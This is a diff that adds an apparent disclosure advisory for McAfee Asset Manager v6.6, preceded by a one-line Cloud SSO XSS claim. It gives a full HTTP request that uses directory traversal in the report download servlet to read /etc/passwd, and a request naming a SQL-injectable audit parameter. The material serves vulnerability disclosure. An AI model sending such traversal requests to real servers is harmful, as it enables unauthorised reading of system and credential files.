@@ -1,0 +1,45 @@
+Cloud SSO is vuln to unauthed XSS in the authentication audit form:
+
+https://twitter.com/BrandonPrry/status/445969380656943104
+
+McAfee Asset Manager v6.6 multiple vulnerabilities
+
+http://www.mcafee.com/us/products/asset-manager.aspx
+
+Authenticated arbitrary file read
+An unprivileged authenticated user can download arbitrary files with the permissions of the web server using the report download functionality.
+By generating a report, the user's browser will make a request to /servlet/downloadReport?reportFileName=blah. The user can put in a relative directory traversal attack and download /etc/passwd.
+
+GET /servlet/downloadReport?reportFileName=../../../../../../../../etc/passwd&format=CSV HTTP/1.1
+Host: 172.31.16.167
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://172.31.16.167/Inventory?filterColumns=&curViewId=-1&maintainQuery=true&format=search&collectorId=null&criticality=0&pageNum=1&location=Inventory&viewSelect=-999999&filterValueField=&orderBy=FIREWALLED&orderBy2=SITE&orderBy3=CRITICALITY_NAME&wsz=200&wszCtrl_1=200&action=AUDIT_REDISCOVER&formatSelect=
+Cookie: JSESSIONID=F92156C7962D8276FC4BF11CEA8FB554
+Connection: keep-alive
+
+
+Authenticated SQL injection
+
+An unprivileged authenticated user can initiate a SQL injection attack by creating an audit report and controlling the username specified in the audit report. In the below request, the 'user' parameter is susceptible to the SQL injection:
+
+POST /jsp/reports/ReportsAudit.jsp HTTP/1.1
+Host: 172.31.16.167
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://172.31.16.167/jsp/reports/ReportsAudit.jsp
+Cookie: JSESSIONID=F92156C7962D8276FC4BF11CEA8FB554
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+
+fromDate=03-19-2014&toDate=03-19-2014&freetext=&Severity=0&AuditType=12&user=Administrator
+
+
+-- 
+http://volatile-minds.blogspot.com -- blog
+http://www.volatileminds.net -- website
